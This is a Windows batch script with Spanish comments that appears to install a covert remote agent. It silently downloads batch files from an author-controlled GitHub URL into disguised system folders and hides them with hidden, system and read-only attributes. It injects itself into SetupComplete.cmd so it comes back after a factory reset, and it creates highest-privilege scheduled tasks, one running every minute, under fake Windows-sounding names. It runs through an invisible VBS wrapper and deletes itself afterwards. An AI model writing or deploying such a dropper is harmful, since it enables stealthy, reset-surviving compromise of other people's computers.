@echo off
setlocal enabledelayedexpansion

:: --- 1. CONFIGURACIÓN DE RUTAS Y RECURSOS ---
set "DIR_SISTEMA=C:\Windows\System32\drivers\etc\vps_logs"
set "DIR_AGENTE=C:\ProgramData\Microsoft\Vault"
set "DIR_RECOVERY=C:\Windows\Setup\Scripts"
set "TARGET_RESET=%DIR_RECOVERY%\SetupComplete.cmd"

:: URLS DE TU CONTROL (Cámbialas por tus links Raw de GitHub)
set "URL_AGENTE=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/SystemAssets/agente.bat"
set "URL_RESTAURADOR=https://raw.githubusercontent.com/kokoronoshojo-a11y/SystemAssets/SystemAssets/WinNetHealth.bat"
:: --- 2. CREACIÓN DE INFRAESTRUCTURA (SILENCIOSA) ---
if not exist "%DIR_SISTEMA%" mkdir "%DIR_SISTEMA%" >nul 2>&1
if not exist "%DIR_AGENTE%" mkdir "%DIR_AGENTE%" >nul 2>&1
if not exist "%DIR_RECOVERY%" mkdir "%DIR_RECOVERY%" >nul 2>&1

:: --- 2.1 DESBLOQUEO Y LIMPIEZA PARA SOBREESCRITURA ---
:: Le quitamos el seguro de "Solo Lectura", "Oculto" y "Sistema" a las versiones viejas
attrib -h -s -r "%DIR_AGENTE%\sys_engine.bat" >nul 2>&1
attrib -h -s -r "%DIR_AGENTE%\run.vbs" >nul 2>&1
attrib -h -s -r "%DIR_SISTEMA%\WinNetHealth.bat" >nul 2>&1

:: Borramos los archivos viejos a la fuerza (/f) y en silencio (/q) por si acaso
del /f /q "%DIR_AGENTE%\sys_engine.bat" >nul 2>&1
del /f /q "%DIR_AGENTE%\run.vbs" >nul 2>&1
del /f /q "%DIR_SISTEMA%\WinNetHealth.bat" >nul 2>&1    
:: --- 3. DESCARGA DE COMPONENTES ---
powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_AGENTE%', '%DIR_AGENTE%\sys_engine.bat')" >nul 2>&1
powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL_RESTAURADOR%', '%DIR_SISTEMA%\WinNetHealth.bat')" >nul 2>&1

:: --- 4. INYECCIÓN DE SUPERVIVENCIA (SetupComplete.cmd) ---
:: Esta parte asegura que si resetean la PC, todo se vuelva a descargar solo.
set "ORDEN_RESTAURADORA=cmd.exe /c %DIR_SISTEMA%\WinNetHealth.bat"

if exist "%TARGET_RESET%" (
    findstr /C:"%ORDEN_RESTAURADORA%" "%TARGET_RESET%" >nul
    if !errorlevel! NEQ 0 (
        attrib -s -h -r "%TARGET_RESET%" >nul 2>&1
        echo. >> "%TARGET_RESET%"
        echo :: System Health Recovery Hook >> "%TARGET_RESET%"
        echo %ORDEN_RESTAURADORA% >> "%TARGET_RESET%"
    )
) else (
    echo @echo off > "%TARGET_RESET%"
    echo :: Windows Setup Customization >> "%TARGET_RESET%"
    echo %ORDEN_RESTAURADORA% >> "%TARGET_RESET%"
)
attrib +h +s +r "%TARGET_RESET%" >nul 2>&1

:: --- 5. CREACIÓN DEL WRAPPER VBS (Invisible) ---
echo Set WshShell = CreateObject("WScript.Shell") > "%DIR_AGENTE%\run.vbs"
echo WshShell.Run "cmd.exe /c %DIR_AGENTE%\sys_engine.bat", 0, False >> "%DIR_AGENTE%\run.vbs"
:: --- 6. REGISTRO DE TAREAS (Configuración de Testeo) ---

:: Tarea 1: El Agente (Ejecución cada 1 minuto)
:: El parámetro /f se encarga de sobreescribir si la tarea ya existe.
schtasks /create /tn "WinSystemVault" /tr "wscript.exe \"%DIR_AGENTE%\run.vbs\"" /sc minute /mo 1 /rl highest /f >nul 2>&1

:: Tarea 2: El Restaurador (Ejecución al iniciar sesión)
:: El parámetro /f se encarga de sobreescribir si la tarea ya existe.
schtasks /create /tn "WinNetHealthCheck" /tr "cmd.exe /c \"%DIR_SISTEMA%\WinNetHealth.bat\"" /sc onlogon /rl highest /f >nul 2>&1

:: --- 7. PROTECCIÓN FINAL Y LIMPIEZA ---
attrib +h +s +r "%DIR_AGENTE%\sys_engine.bat" >nul 2>&1
attrib +h +s +r "%DIR_AGENTE%\run.vbs" >nul 2>&1
attrib +h +s +r "%DIR_SISTEMA%\WinNetHealth.bat" >nul 2>&1

:: Ejecutamos el restaurador una vez para confirmar que todo arrancó bien
start /b "" cmd /c "%DIR_SISTEMA%\WinNetHealth.bat"


:: AUTODESTRUCCIÓN
timeout /t 2 /nobreak >nul
del "%~f0" & exit
